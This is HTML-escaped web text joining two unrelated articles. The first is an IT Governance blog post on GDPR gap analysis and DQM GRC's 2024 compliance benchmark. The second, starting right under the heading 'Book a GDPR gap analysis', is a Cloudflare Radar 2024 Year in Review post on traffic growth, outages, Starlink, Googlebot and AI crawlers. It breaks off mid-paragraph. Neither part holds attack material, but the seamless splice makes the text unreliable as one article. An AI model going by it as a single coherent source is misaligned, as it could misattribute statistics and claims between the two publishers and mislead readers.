&lt;p&gt;&lt;strong&gt;When implementing a &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;GDPR (General Data Protection Regulation)&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; compliance programme, a key challenge is securing the required resources and support – particularly from top management.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Yet GDPR compliance brings business benefits beyond mitigating the risk of data breaches and &lt;a href="https://www.itgovernance.co.uk/dpa-and-gdpr-penalties" rel="noreferrer noopener" target="_blank"&gt;fines&lt;/a&gt;:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;You’ll stop duplicating work, improving productivity.&lt;/li&gt;



&lt;li&gt;You can better tie down the requirements for RBAC (role-based &lt;a href="https://www.itgovernance.co.uk/blog/what-is-access-control" rel="noreferrer noopener" target="_blank"&gt;access control&lt;/a&gt;).&lt;/li&gt;



&lt;li&gt;You can clearly define roles and responsibilities in job descriptions and other documentation.&lt;/li&gt;



&lt;li&gt;Your information will be more organised, so you can find what you need quicker, and with greater confidence in its accuracy.&lt;/li&gt;



&lt;li&gt;You’ll get rid of data you don’t need, in line with your retention policy. That saves storage space and costs, and gives you more accurate insights into your data.&lt;/li&gt;
&lt;/ul&gt;







&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;The value of a gap analysis&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;But how can you get management to understand these benefits, and more to the point, understand how far away the organisation is from compliance?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-gap-analysis" rel="noreferrer noopener" target="_blank"&gt;GDPR gap analysis&lt;/a&gt; offers a useful tool here – particularly if conducted by an independent third party.&lt;/p&gt;



&lt;p&gt;A gap analysis (or ‘gap assessment’) compares an organisation’s current measures against an ideal ‘target state’ – in this case, GDPR compliance.&lt;/p&gt;



&lt;p&gt;Gap analyses typically produce a report following the assessment, often with a prioritised action plan, that can function as a ‘reality check’ to management. It can help support your case to the board for needing extra resources.&lt;/p&gt;

&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;GDPR compliance in the UK: “quite low”&lt;/h2&gt;



&lt;p&gt;DQM GRC’s &lt;a href="https://www.dqmgrc.com/resources/gdpr-benchmark-report" rel="noreferrer noopener" target="_blank"&gt;GDPR Benchmark Report 2024&lt;/a&gt; – based on gap analysis data – shows that &lt;strong&gt;many UK organisations have significant room for improvement when it comes to GDPR compliance&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;The average score was 5.3, which DQM GRC described as “quite low”.&lt;/p&gt;



&lt;p&gt;That said, the report also found that, on average, organisations performed better in certain GDPR compliance areas over others.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Privacy by design&lt;/h3&gt;



&lt;p&gt;For instance, the report found that privacy by design is the weakest compliance area.&lt;/p&gt;



&lt;p&gt;This may be because organisations are less likely to treat privacy risks as business risks – yet privacy by design improves business projects, because they make for simpler, more user-friendly software (or more customer-friendly products and services).&lt;/p&gt;



&lt;p&gt;When you think about what data should be available to each process, you both improve your level of data security &lt;em&gt;and&lt;/em&gt; force designers to take the time to consider what the process needs to do and why.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;(This is also key to &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/blog/how-to-select-effective-security-controls" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;effective control selection&lt;/em&gt;&lt;/a&gt;&lt;em&gt; in information security.)&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;Privacy by design also brings less conspicuous benefits:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;It requires &lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-documentation-toolkit" rel="noreferrer noopener" target="_blank"&gt;better documentation&lt;/a&gt;, which makes your projects easier to manage and, when you need it, will make &lt;a href="https://www.itgovernance.co.uk/bc-dr" rel="noreferrer noopener" target="_blank"&gt;disaster recovery&lt;/a&gt; easier.&lt;/li&gt;



&lt;li&gt;Because you’ll need to look further ahead as you plan your project, it helps create more efficient processes and systems.&lt;/li&gt;



&lt;li&gt;It also ensures you keep your data in appropriate formats ready for future use, and prevents you from using personal data in ways you shouldn’t.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In short, privacy by design is something you &lt;em&gt;should&lt;/em&gt; be doing, irrespective of any legal requirements.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Information security&lt;/h3&gt;



&lt;p&gt;Meanwhile, the &lt;a href="https://www.dqmgrc.com/resources/gdpr-benchmark-report" rel="noreferrer noopener" target="_blank"&gt;GDPR Benchmark Report 2024&lt;/a&gt; found that organisations perform better on information security (compliance area ‘ISMS’ – information security management system).&lt;/p&gt;



&lt;p&gt;DQM GRC suggested this is due to information and cyber security issues being more prone to receiving negative press than data protection issues, so organisations are more likely to treat cyber security risks as business risks.&lt;/p&gt;



&lt;p&gt;Damian Garcia, our head of GRC (governance, risk and compliance) consultancy, added:&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;em&gt;Another possibility for this finding is that prior to 2018 [when the GDPR was enforced], organisations – particularly smaller businesses – may have struggled to justify expenditure on security.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;In part, this was due to their attitude, often along the lines of: “Who would want to steal our data? It isn’t worth anything.”&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;In other words, business owners struggled to attribute a value to their data.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;But when the GDPR was introduced, organisations could more easily place a value on the personal data they were holding: the greater of €20 million [now £17.5 million under the UK GDPR] or 4% of annual global turnover.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;This may have helped convince management for the need to invest in security controls, and perhaps even implement an &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/iso27001" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;ISO 27001&lt;/em&gt;&lt;/a&gt;&lt;em&gt;-compliant ISMS.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Book a GDPR gap analysis&lt;/h2&gt;

          &lt;p&gt;Over the last four years (&lt;a href="https://blog.cloudflare.com/cloudflare-radar-2020-year-in-review/"&gt;&lt;u&gt;2020&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/cloudflare-radar-2021-year-in-review/"&gt;&lt;u&gt;2021&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/radar-2022-year-in-review/"&gt;&lt;u&gt;2022&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;), we have aggregated perspectives from &lt;a href="https://radar.cloudflare.com/"&gt;&lt;u&gt;Cloudflare Radar&lt;/u&gt;&lt;/a&gt; into an annual Year In Review, illustrating the Internet’s patterns across multiple areas over the course of that year. The &lt;a href="https://radar.cloudflare.com/year-in-review/2024"&gt;&lt;u&gt;Cloudflare Radar 2024 Year In Review&lt;/u&gt;&lt;/a&gt; microsite continues that tradition, featuring interactive charts, graphs, and maps you can use to explore and compare notable Internet trends observed throughout this past year.&lt;/p&gt;&lt;p&gt;Cloudflare’s &lt;a href="https://www.cloudflare.com/network"&gt;&lt;u&gt;network&lt;/u&gt;&lt;/a&gt; currently spans more than 330 cities in over 120 countries/regions, serving an average of over 63 million HTTP(S) requests per second for millions of Internet properties, in addition to handling over 42 million DNS requests per second on average. The resulting data generated by this usage, combined with data from other complementary Cloudflare tools, enables Radar to provide unique near-real time perspectives on the patterns and trends around security, traffic, performance, and usage that we observe across the Internet. &lt;/p&gt;&lt;p&gt;The 2024 Year In Review is organized into five sections: &lt;a href="https://radar.cloudflare.com/year-in-review/2024#traffic"&gt;&lt;u&gt;Traffic&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#adoption-and-usage"&gt;&lt;u&gt;Adoption &amp;amp; Usage&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#connectivity"&gt;&lt;u&gt;Connectivity&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#security"&gt;&lt;u&gt;Security&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024#email-security"&gt;&lt;u&gt;Email Security&lt;/u&gt;&lt;/a&gt; and covers the period from January 1 to December 1, 2024. We have incorporated several new metrics this year, including AI bot &amp;amp; crawler traffic, search engine and browser market share, connection tampering, and “most dangerous” top level domains (TLDs). To ensure consistency, we have kept underlying methodologies consistent with previous years’ calculations. Trends for 200 countries/regions are available on the microsite; smaller or less populated locations are excluded due to insufficient data. Some metrics are only shown worldwide, and are not displayed if a country/region is selected. &lt;/p&gt;&lt;p&gt;Below, we provide an overview of the content contained within the major Year In Review sections (Traffic, Adoption &amp;amp; Usage, Connectivity, Security, and Email Security), along with notable observations and key findings. In addition, we have also published a companion blog post that specifically explores trends seen across &lt;a href="https://blog.cloudflare.com/radar-2024-year-in-review-internet-services/"&gt;&lt;u&gt;Top Internet Services&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;The key findings and associated discussion within this post only provide a high-level perspective on the unique insights that can be found in the &lt;a href="https://radar.cloudflare.com/year-in-review/2024"&gt;&lt;u&gt;Year in Review microsite&lt;/u&gt;&lt;/a&gt;. Visit the microsite to explore the various datasets and metrics in more detail, including trends seen in your country/region, how these trends have changed as compared to 2023, and how they compare to other countries/regions of interest. Surveying the Internet from this vantage point provides insights that can inform decisions on everything from an organization’s security posture and IT priorities to product development and strategy. &lt;/p&gt;

            &lt;h3&gt;Global Internet traffic grew 17.2% in 2024.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#global-internet-traffic-grew-17-2-in-2024"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;An inflection point for Internet traffic arguably occurred thirty years ago. The World Wide Web went mainstream in 1994, thanks to the late 1993 &lt;a href="https://cybercultural.com/p/1993-mosaic-launches-and-the-web-is-set-free/"&gt;&lt;u&gt;release&lt;/u&gt;&lt;/a&gt; of the &lt;a href="https://www.ncsa.illinois.edu/research/project-highlights/ncsa-mosaic/"&gt;&lt;u&gt;NCSA Mosaic&lt;/u&gt;&lt;/a&gt; browser for multiple popular operating systems, which included support for embedded images. In turn, “heavier” (in contrast to text-based) Internet content became the norm, and coupled with the growth in consumption through popular online services and the emerging consumer ISP industry, &lt;a href="https://blogs.cisco.com/sp/the-history-and-future-of-internet-traffic"&gt;&lt;u&gt;Internet traffic began to rapidly increase&lt;/u&gt;&lt;/a&gt;, and that trend has continued to the present.&lt;/p&gt;&lt;p&gt;To determine the traffic trends over time for the Year in Review, we use the average daily traffic volume (excluding bot traffic) over the second full calendar week (January 8-15) of 2024 as our baseline. (The second calendar week is used to allow time for people to get back into their “normal” school and work routines after the winter holidays and New Year’s Day. The percent change shown in the traffic trends chart is calculated relative to the baseline value — it does not represent absolute traffic volume for a country/region. The trend line represents a seven-day trailing average, which is used to smooth the sharp changes seen with data at a daily granularity. To compare 2024’s traffic trends with 2023 data and/or other locations, click the “Compare” icon at the upper right of the graph.&lt;/p&gt;&lt;p&gt;Throughout the first half of 2024, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#internet-traffic-growth"&gt;&lt;u&gt;worldwide Internet traffic growth&lt;/u&gt;&lt;/a&gt; appeared to be fairly limited, within a percent or two on either side of the baseline value through mid-August. However, at that time growth clearly began to accelerate, climbing consistently through the end of November, growing 17.2% for the year. This trend is similar to those also seen in 2023 and 2022, as we discussed in the &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/"&gt;&lt;u&gt;2023 Year in Review blog post&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Internet traffic trends in 2024, worldwide&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;The West African country of &lt;a href="https://radar.cloudflare.com/year-in-review/2024/gn?previousYear=true"&gt;&lt;u&gt;Guinea&lt;/u&gt;&lt;/a&gt; experienced the most significant Internet traffic growth seen in 2024, reaching as much as 350% above baseline. Traffic growth didn’t begin in earnest until late February, and reached an initial peak in early April. It remained between 100% and 200% above baseline until September, when it experienced several multi-week periods of growth. While the September-November periods of traffic growth also occurred in 2023, they peaked at under 90% above baseline.&lt;/p&gt;&lt;p&gt;The impact of significant Internet outages is also clearly visible when looking at data across the year. Two significant Internet outages in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cu#internet-traffic-growth"&gt;&lt;u&gt;Cuba&lt;/u&gt;&lt;/a&gt; are clearly visible as large drops in traffic in October and November. A reported “complete disconnection” of the national electricity system on the island &lt;a href="https://x.com/CloudflareRadar/status/1847325224208891950"&gt;&lt;u&gt;occurred on October 18&lt;/u&gt;&lt;/a&gt;, lasting &lt;a href="https://x.com/CloudflareRadar/status/1848680148813406474"&gt;&lt;u&gt;just over three days&lt;/u&gt;&lt;/a&gt;. Just a couple of weeks later, on November 6, &lt;a href="https://x.com/CloudflareRadar/status/1854291286322544752"&gt;&lt;u&gt;damage from Hurricane Rafael caused widespread power outages in Cuba&lt;/u&gt;&lt;/a&gt;, resulting in another large drop in Internet traffic. Traffic has remained lower as Cuba’s electrical infrastructure &lt;a href="https://x.com/CloudflareRadar/status/1864263679442567604"&gt;&lt;u&gt;continues to struggle&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Internet traffic trends in 2024, Cuba&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;As we frequently discuss in Cloudflare Radar blog and social media posts, government-directed Internet shutdowns occur all too frequently, and the impact of these actions are also clearly visible when looking at long-term traffic data. In &lt;a href="https://radar.cloudflare.com/year-in-review/2024/bd#internet-traffic-growth"&gt;&lt;u&gt;Bangladesh&lt;/u&gt;&lt;/a&gt;, the government ordered the &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#bangladesh"&gt;&lt;u&gt;shutdown of mobile Internet connectivity&lt;/u&gt;&lt;/a&gt; on July 18, in response to student protests. Shortly after mobile networks were shut down, fixed broadband networks were taken offline as well, resulting in a near complete loss of Internet traffic from the country. Connectivity gradually returned over the course of several days, between July 23-28.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5FvubyG6qMeZ9hv1wgFayl/91d356b23788a8f9cdd970cc7e65f8fc/traffic_-_Bangladesh.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Internet traffic trends in 2024, Bangladesh&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;As we also noted last year, the celebration of major holidays can also have a visible impact on Internet traffic at a country level. For example, in Muslim countries including &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ae?compareWith=ID#internet-traffic-growth"&gt;&lt;u&gt;Indonesia and the United Arab Emirates&lt;/u&gt;&lt;/a&gt;, the celebration of Eid al-Fitr, the festival marking the end of the fast of Ramadan, is visible as a noticeable drop in traffic around April 9-10. &lt;/p&gt;

        &lt;p&gt;Over the last several years, the Year In Review has ranked the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#internet-services"&gt;&lt;u&gt;most popular Internet services&lt;/u&gt;&lt;/a&gt;. These rankings cover an “overall” perspective, as well as a dozen more specific categories, based on analysis of anonymized query data of traffic to our &lt;a href="https://1.1.1.1/dns"&gt;&lt;u&gt;1.1.1.1 public DNS resolver&lt;/u&gt;&lt;/a&gt; from millions of users around the world. For the purposes of these rankings, domains that belong to a single Internet service are grouped together.&lt;/p&gt;&lt;p&gt;Google once again held the top spot overall, supported by its broad portfolio of services, as well as the popularity of the Android mobile operating system (more on that &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-nearly-one-third-of-mobile-device-traffic-was-from-apple-ios-devices-android-had-a-90-share-of-mobile-device-traffic-in-29-countries-regions-peak-ios-mobile-device-traffic-share-was-over-60-in-eight-countries-regions"&gt;&lt;u&gt;below&lt;/u&gt;&lt;/a&gt;). Meta properties Facebook, Instagram, and WhatsApp also held spots in the top 10.&lt;/p&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/ai/what-is-generative-ai/"&gt;&lt;u&gt;Generative AI&lt;/u&gt;&lt;/a&gt; continued to grow in popularity throughout 2024, and in this category, OpenAI again held the top spot, building on the continued success and popularity of ChatGPT. Within Social Media, the top five remained consistent with 2023’s and 2022’s ranking, including Facebook, TikTok, Instagram, X, and Snapchat.&lt;/p&gt;&lt;p&gt;These categorical rankings, as well as trends seen by specific services, are explored in more detail in a separate blog post, &lt;a href="https://blog.cloudflare.com/radar-2024-year-in-review-internet-services/"&gt;&lt;i&gt;&lt;u&gt;From ChatGPT to Temu: ranking top Internet services in 2024&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Global traffic from Starlink grew 3.3x in 2024, in line with last year’s growth rate. After initiating service in Malawi in July 2023, Starlink traffic from that country grew 38x in 2024.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#global-traffic-from-starlink-grew-3-3x-in-2024-in-line-with-last-years-growth-rate-after-initiating-service-in-malawi-in-july-2023-starlink-traffic-from-that-country-grew-38x-in-2024"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;SpaceX’s Starlink continues to be the leading satellite Internet service provider, bringing connectivity to unserved or underserved areas. In addition to opening up new markets in 2024, Starlink also announced relationships to provide in-flight connectivity to &lt;a href="https://www.cnbc.com/2024/09/17/spacexs-starlink-has-2500-aircraft-under-contract.html"&gt;&lt;u&gt;multiple airlines&lt;/u&gt;&lt;/a&gt;, and on &lt;a href="https://x.com/Starlink/status/1790426484022342081"&gt;&lt;u&gt;cruise ships&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://x.com/Starlink/status/1857166233969607123"&gt;&lt;u&gt;trains&lt;/u&gt;&lt;/a&gt;, as well as enabling subscribers to roam with their subscription using the &lt;a href="https://www.theverge.com/2024/7/11/24196294/starlink-mini-available-us-price-specs"&gt;&lt;u&gt;Starlink Mini&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;We analyzed aggregate Cloudflare traffic volumes associated with Starlink's primary &lt;a href="https://www.cloudflare.com/learning/network-layer/what-is-an-autonomous-system/"&gt;&lt;u&gt;autonomous system&lt;/u&gt;&lt;/a&gt; (&lt;a href="https://radar.cloudflare.com/as14593"&gt;&lt;u&gt;AS14593&lt;/u&gt;&lt;/a&gt;) to track the growth in usage of the service throughout 2024. Similar to the traffic trends discussed above, the request volume shown on the trend line in the chart represents a seven-day trailing average. Comparisons with 2023 data can be shown by clicking the “Compare” icon at the upper right of the graph. Within comparative views, the lines are scaled to the maximum value shown.&lt;/p&gt;&lt;p&gt;On a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#starlink-traffic.trends"&gt;&lt;u&gt;worldwide&lt;/u&gt;&lt;/a&gt; basis, steady, consistent growth was seen across the year, though it accelerates throughout November. This acceleration may have been driven by traffic associated with customer-specific large software updates. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6Dy2qt4O5b3MCswkckhELA/aa29c7235497bed8c985aa9dd9b63477/traffic_-_Starlink_worldwide.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Starlink traffic growth worldwide in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;In many locations, there is pent-up demand for “alternative” connectivity providers such as Starlink, and in these countries/regions, we see rapid traffic growth when service becomes available, such as in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/zw#starlink-traffic.trends"&gt;&lt;u&gt;Zimbabwe&lt;/u&gt;&lt;/a&gt;. Service availability was &lt;a href="https://x.com/Starlink/status/1832392080481563037"&gt;&lt;u&gt;announced on September 7&lt;/u&gt;&lt;/a&gt;, and traffic from the country began to grow rapidly almost immediately thereafter.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1aLywcrB5w88flsDyK1R1q/1039d989e19dc566cf5f62e60f3f1886/traffic_-_Starlink_Zimbabwe.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Starlink traffic growth in Zimbabwe in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;In new markets, traffic growth continues after that initial increase. For example Starlink service became available in Malawi &lt;a href="https://x.com/Starlink/status/1683897037639790592"&gt;&lt;u&gt;in July 2023&lt;/u&gt;&lt;/a&gt;, and throughout 2024, Starlink traffic from the country grew 38x. While &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mw#starlink-traffic.trends"&gt;&lt;u&gt;Malawi’s 38x increase&lt;/u&gt;&lt;/a&gt; is impressive, other countries also experienced significant growth. In the Eastern European country of &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ge#starlink-traffic.trends"&gt;&lt;u&gt;Georgia&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://x.com/Starlink/status/1719581885200998485"&gt;&lt;u&gt;service became available on November 1, 2023&lt;/u&gt;&lt;/a&gt;. After a slow ramp, traffic began to take off growing over 100x through 2024. In &lt;a href="https://radar.cloudflare.com/year-in-review/2024/py#starlink-traffic.trends"&gt;&lt;u&gt;Paraguay&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://x.com/Starlink/status/1737914318522581489"&gt;&lt;u&gt;service availability was announced on December 21&lt;/u&gt;&lt;/a&gt;, and began to grow at the beginning of January, registering an increase of over 900x across the year.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6AXOON7CO7XgnWSNnezoiF/bd56192d682c574a2d242845bb0eda16/traffic_-_Starlink_Malawi.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Starlink traffic growth in Malawi in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Googlebot was responsible for the highest volume of request traffic to Cloudflare in 2024 as it retrieved content from millions of Cloudflare customer sites for search indexing. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#googlebot-was-responsible-for-the-highest-volume-of-request-traffic-to-cloudflare-in-2024-as-it-retrieved-content-from-millions-of-cloudflare-customer-sites-for-search-indexing"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare Radar shows users Internet traffic trends over a selected period of time, but at a country/region or network level. However, &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/#googlebot-was-responsible-for-the-highest-volume-of-request-traffic-to-cloudflare-in-2023"&gt;&lt;u&gt;as we did in 2023&lt;/u&gt;&lt;/a&gt;, we again wanted to look at the traffic Cloudflare saw over the course of the full year from the entire IPv4 Internet. To do so, we can use &lt;a href="https://en.wikipedia.org/wiki/Hilbert_curve"&gt;&lt;u&gt;Hilbert curves&lt;/u&gt;&lt;/a&gt;, which allow us to visualize a sequence of IPv4 addresses in a two-dimensional pattern that keeps nearby IP addresses close to each other, making them &lt;a href="https://xkcd.com/195/"&gt;&lt;u&gt;useful&lt;/u&gt;&lt;/a&gt; for surveying the Internet's IPv4 address space.&lt;/p&gt;&lt;p&gt;Using a Hilbert curve, we can &lt;a href="https://radar.cloudflare.com/year-in-review/2024#ipv4-traffic-distribution"&gt;&lt;u&gt;visualize aggregated IPv4 request traffic to Cloudflare&lt;/u&gt;&lt;/a&gt; from January 1 through December 1, 2024. Within the visualization, we aggregate IPv4 addresses at a &lt;a href="https://www.ripe.net/about-us/press-centre/IPv4CIDRChart_2015.pdf"&gt;&lt;u&gt;/20&lt;/u&gt;&lt;/a&gt; level, meaning that at the highest zoom level, each square represents traffic from 4,096 IPv4 addresses. This aggregation is done to keep the amount of data used for the visualization manageable. (While we would like to create a similar visualization for IPv6 traffic, the enormity of the full IPv6 address space would make associated traffic very &lt;a href="https://observablehq.com/@vasturiano/hilbert-map-of-ipv6-address-space"&gt;&lt;u&gt;hard to see&lt;/u&gt;&lt;/a&gt; in such a visualization, especially as such a small amount has been &lt;a href="https://www.iana.org/numbers/allocations/"&gt;&lt;u&gt;allocated for assignment by the Regional Internet Registries&lt;/u&gt;&lt;/a&gt;.)&lt;/p&gt;&lt;p&gt;Within the visualization, IP addresses are grouped by ownership, and for much of the IP address space shown there, a mouseover at the default zoom level will show the &lt;a href="https://www.nro.net/about/rirs/"&gt;&lt;u&gt;Regional Internet Registry (RIR)&lt;/u&gt;&lt;/a&gt; that the address block belongs to. However, there are also a number of blocks that were assigned prior to the existence of the RIR system, and for these, they are labeled with the name of the organization that owns them. Progressive zooming ultimately shows the autonomous system and country/region that the IP address block is associated with, as well as its share of traffic relative to the maximum. (If a country/region is selected, only the IP address blocks associated with that location are visible.) Overall traffic shares are indicated by shading based on a color scale, and although a number of large unshaded blocks are visible, this does not necessarily mean that the associated address space is unused, but rather that it may be used in a way that does not generate traffic to Cloudflare.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6gtrL1H2gUjSKH7AMSabgM/361d38f34860258449a914e26519a4b4/traffic_-_Hilbert_curve.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Hilbert curve showing aggregated 2024 traffic to Cloudflare across the IPv4 Internet&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Warmer orange/red shading within the visualization represents areas of higher request volume, and buried within one of those areas is the IP address block that had the maximum request volume to Cloudflare during 2024. As it was in 2023, this address block was &lt;a href="https://radar.cloudflare.com/routing/prefix/66.249.64.0/20"&gt;&lt;u&gt;66.249.64.0/20&lt;/u&gt;&lt;/a&gt;, which belongs to Google, and is &lt;a href="https://developers.google.com/static/search/apis/ipranges/googlebot.json"&gt;&lt;u&gt;one of several&lt;/u&gt;&lt;/a&gt; used by the &lt;a href="https://developers.google.com/search/docs/crawling-indexing/googlebot"&gt;&lt;u&gt;Googlebot&lt;/u&gt;&lt;/a&gt; web crawler to retrieve content for search indexing. This use of that address space is a likely explanation for the high request volume, given the number of web properties on Cloudflare’s network.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/g5rQhT7r4DsgpzYdMT3QT/0d6809d96791ee7165ada170d24156e3/traffic_-_Hilbert_curve_Googlebot.png" /&gt;

            &lt;h3&gt;Among AI bots and crawlers, Bytespider (ByteDance) traffic gradually declined over the course of 2024, while ClaudeBot (Anthropic) was more active during the back half of the year.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#among-ai-bots-and-crawlers-bytespider-bytedance-traffic-gradually-declined-over-the-course-of-2024-while-claudebot-anthropic-was-more-active-during-the-back-half-of-the-year"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;AI bots and crawlers have been in the news throughout 2024 as they voraciously consume content to train ever-evolving models. Controversy has followed them, as not all bots and crawlers respect content owner directives to restrict crawling activity. In July, Cloudflare enabled customers to &lt;a href="https://blog.cloudflare.com/declaring-your-aindependence-block-ai-bots-scrapers-and-crawlers-with-a-single-click/"&gt;&lt;u&gt;block these bots and crawlers with a single click&lt;/u&gt;&lt;/a&gt;, and during Birthday Week &lt;a href="https://blog.cloudflare.com/cloudflare-ai-audit-control-ai-content-crawlers/"&gt;&lt;u&gt;we introduced AI Audit&lt;/u&gt;&lt;/a&gt; to give website owners even more visibility into and control over how AI platforms access their content. &lt;/p&gt;&lt;p&gt;Tracking traffic trends for AI bots can help us better understand their activity over time — observing which are the most aggressive and have the highest volume of requests, which perform crawls on a regular basis, etc. The new &lt;a href="https://radar.cloudflare.com/traffic#ai-bot-crawler-traffic"&gt;&lt;u&gt;AI bot &amp;amp; crawler traffic graph on Radar’s Traffic page&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/bringing-ai-to-cloudflare/#ai-bot-traffic-insights-on-cloudflare-radar"&gt;&lt;u&gt;launched in September&lt;/u&gt;&lt;/a&gt;, provides insight into these traffic trends gathered over the selected time period for the top known AI bots. &lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#ai-bot-and-crawler-traffic"&gt;&lt;u&gt;Looking at traffic trends&lt;/u&gt;&lt;/a&gt; from two of those bots, we can see some interesting patterns. &lt;a href="https://darkvisitors.com/agents/bytespider"&gt;&lt;u&gt;Bytespider&lt;/u&gt;&lt;/a&gt; is a crawler operated by ByteDance, the Chinese owner of TikTok, and is reportedly used to download training data for ByteDance’s Large Language Models (LLMs). 